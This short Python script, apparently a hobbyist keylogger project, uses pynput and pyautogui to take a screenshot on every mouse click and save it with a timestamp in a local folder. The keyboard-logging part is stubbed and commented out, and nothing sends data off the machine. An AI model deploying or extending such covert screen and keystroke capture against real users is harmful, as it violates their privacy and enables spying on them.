from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as pyt

datanow = datetime.now()
data = datanow.strftime('%D_%M')
saves = r'C:\Users\arthu\Desktop\Save\Content_' + data + '\\'
arqlog = saves + 'keylogger.log'

try:
    os.mkdir(saves)
except:
    pass

def on_press():
    pass

def on_click(x, y, button, pressed):
    if pressed:
        screenshot = pyt.screenshot()
        hora = datetime.now()
        horaprint = hora.strftime('%H_%M_%S')
        file_var = 'printklp_'+ horaprint +'.jpg'
        screenshot.save(os.path.join(saves + file_var))


#keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

#keyboardListener.start()
mouseListener.start()
#keyboardListener.join()
mouseListener.join()
